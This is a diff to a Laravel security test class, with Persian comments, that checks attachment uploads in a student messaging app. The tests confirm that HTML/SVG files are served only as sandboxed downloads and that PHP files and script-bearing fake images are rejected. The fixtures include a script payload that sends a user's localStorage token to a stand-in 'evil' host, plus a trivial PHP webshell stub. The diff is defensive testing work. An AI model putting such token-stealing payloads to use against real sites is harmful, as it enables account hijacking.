@@ -173,7 +173,20 @@ class SecurityHardeningTest extends TestCase
 
     // ------------------------------------------------- ۳) آپلود پیوست
 
-    public function test_html_and_svg_attachments_are_rejected(): void
+    /**
+     * مارک‌آپ (html/svg) به‌عنوان فایل کد پذیرفته می‌شود، اما هرگز اجرا نمی‌شود.
+     *
+     * پذیرشِ پسوند با امن بودنِ سرو یکی نیست: `AttachmentController` همیشه
+     * ‎application/octet-stream‎ + ‎Content-Disposition: attachment‎ +
+     * ‎X-Content-Type-Options: nosniff‎ + CSP ‎sandbox‎ می‌فرستد، پس مرورگر
+     * این فایل‌ها را رندر یا اجرا نمی‌کند و فقط دانلود می‌کند. این آزمون همان
+     * invariant را نگه می‌دارد.
+     *
+     * پسوندهای اجراشدنی روی دیسک (‎.php‎/‎.phtml‎) همچنان رد می‌شوند؛ آن‌ها را
+     * {@see self::test_extension_with_trailing_whitespace_cannot_smuggle_php()}
+     * پوشش می‌دهد.
+     */
+    public function test_html_and_svg_attachments_are_accepted_but_never_served_as_executable_content(): void
     {
         $student = $this->makeStudent();
         $conversation = Conversation::create([
@@ -181,15 +194,88 @@ class SecurityHardeningTest extends TestCase
             'title' => 'تست امنیت',
         ]);
 
+        $payload = '<script>fetch("//evil/"+localStorage.aio_token)</script>';
+
         foreach (['payload.html', 'payload.svg', 'payload.htm'] as $name) {
+            $response = $this->actingAs($student, 'sanctum')
+                ->postJson("/api/conversations/{$conversation->id}/messages", [
+                    'body' => 'ارسال فایل کد',
+                    'attachment' => File::fake()->createWithContent($name, $payload),
+                ])
+                ->assertStatus(201);
+
+            $served = $this->actingAs($student, 'sanctum')
+                ->get((string) $response->json('data.url'))
+                ->assertStatus(200);
+
+            // هدرهایی که اجازه‌ی رندر یا اجرا نمی‌دهند
+            $served->assertHeader('Content-Type', 'application/octet-stream');
+            $served->assertHeader('X-Content-Type-Options', 'nosniff');
+            $served->assertHeader('Content-Security-Policy', "default-src 'none'; sandbox");
+
+            // نامِ روی دیسک تصادفی است، ولی باید `attachment` باشد نه `inline`
+            $disposition = (string) $served->headers->get('Content-Disposition');
+            $this->assertStringStartsWith('attachment;', $disposition);
+            $this->assertStringNotContainsString('inline', $disposition);
+            // و پسوندِ اصلی حفظ شده باشد
+            $this->assertMatchesRegularExpression(
+                '/\.'.preg_quote(pathinfo($name, PATHINFO_EXTENSION), '/').'"$/',
+                $disposition,
+            );
+        }
+    }
+
+    /**
+     * پسوند اجراشدنی روی دیسک باید رد شود، حتی اگر محتوایش متن ساده باشد.
+     *
+     * ‎.html‎ با فایل‌سازی در آزمون بالا پذیرفته می‌شود چون فقط دانلود
+     * می‌شود؛ ‎.php‎ فرق دارد چون اگر روزی storage داخل web root قرار گیرد،
+     * php-fpm آن را اجرا می‌کند.
+     */
+    public function test_php_attachments_are_rejected(): void
+    {
+        $student = $this->makeStudent();
+        $conversation = Conversation::create([
+            'student_id' => $student->id,
+            'title' => 'تست وب‌شل',
+        ]);
+
+        foreach (['shell.php', 'shell.phtml'] as $name) {
             $this->actingAs($student, 'sanctum')
                 ->postJson("/api/conversations/{$conversation->id}/messages", [
-                    'body' => 'تلاش برای بارگذاری فایل مخرب',
+                    'body' => 'تلاش برای بارگذاری وب‌شل',
+                    'attachment' => File::fake()->createWithContent($name, '<?php echo "pwned"; ?>'),
+                ])
+                ->assertStatus(422);
+        }
+    }
+
+    /**
+     * محتوای HTML نباید با پسوند تصویرِ واقعی رد شود.
+     *
+     * ‎.png‎/‎.gif‎/‎.jpg‎ در گروه «تصویر» می‌مانند و فقط نوع‌های تصویریِ
+     * واقعی را قبول می‌کنند، پس یک فایل متنی با این نام‌ها همچنان ۴۲۲ می‌گیرد.
+     * ‎.svg‎ عمداً در گروه «متن/مارک‌آپ» است و پذیرفته می‌شود، ولی چون
+     * سرور همیشه octet-stream + ‎attachment‎ می‌فرستد رندر نمی‌شود.
+     */
+    public function test_html_content_cannot_slip_through_under_an_image_extension(): void
+    {
+        $student = $this->makeStudent();
+        $conversation = Conversation::create([
+            'student_id' => $student->id,
+            'title' => 'تست دور زدن پسوند',
+        ]);
+
+        foreach (['photo.png', 'photo.gif', 'photo.jpg'] as $name) {
+            $this->actingAs($student, 'sanctum')
+                ->postJson("/api/conversations/{$conversation->id}/messages", [
+                    'body' => 'عکس جعلی',
                     'attachment' => File::fake()->createWithContent(
                         $name,
                         '<script>fetch("//evil/"+localStorage.aio_token)</script>',
                     ),
-                ])->assertStatus(422);
+                ])
+                ->assertStatus(422);
         }
     }
 
